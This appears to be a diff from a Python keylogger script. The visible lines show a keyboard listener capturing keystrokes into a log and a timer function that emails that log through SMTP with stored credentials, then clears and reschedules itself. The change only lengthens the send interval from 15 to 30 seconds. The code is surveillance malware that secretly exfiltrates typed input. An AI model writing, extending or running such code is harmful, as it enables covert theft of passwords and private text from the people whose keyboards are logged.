@@ -36,7 +36,7 @@ def threading_send_meil():
     global log
     smtp(key.email,key.password)
     log = ""
-    threading.Timer(15,threading_send_meil).start()
+    threading.Timer(30,threading_send_meil).start()
 
 key = user_inputs()
 get_key = keyboard.Listener(on_press=call_func)
